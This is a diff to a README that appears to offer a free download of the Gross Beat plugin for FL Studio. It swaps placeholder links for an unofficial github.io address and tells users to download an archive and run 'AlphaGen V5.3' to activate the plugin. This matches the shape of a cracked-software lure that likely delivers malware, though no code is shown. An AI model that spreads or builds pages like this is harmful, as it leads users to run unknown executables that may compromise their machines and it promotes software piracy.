@@ -2,13 +2,13 @@
 
 Unlock real-time glitch, gate, stutter, and scratch effects in FL Studio with Gross Beat. Enhance your sound design and live performance capabilities with a professional-grade audio plugin trusted by top producers.
 
-[![Download](https://img.shields.io/badge/Download-Gross_Beat-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Gross_Beat-blueviolet)](https://gross-beat-fl-studio.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://gross-beat-fl-studio.github.io/.github)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch FL Studio and start using Gross Beat with full functionality
